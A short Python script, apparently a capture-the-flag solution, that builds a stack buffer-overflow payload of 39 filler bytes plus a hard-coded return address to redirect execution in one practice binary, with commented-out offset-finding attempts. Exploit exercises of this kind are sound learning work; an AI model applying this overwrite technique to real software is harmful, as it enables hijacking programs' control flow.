#!/bin/python3
import struct
# payload = 'a' * 32
# segfault on 0x42424242 ie C
# '\x76\x11\x40\x00'
addr = 0x004011f0
payload = 'a' * 39 + '\x96\x11\x40\x00'
# i = 0
# while i < 26:
#    payload += chr(i + 65) * 4
#    i += 1
print(payload)
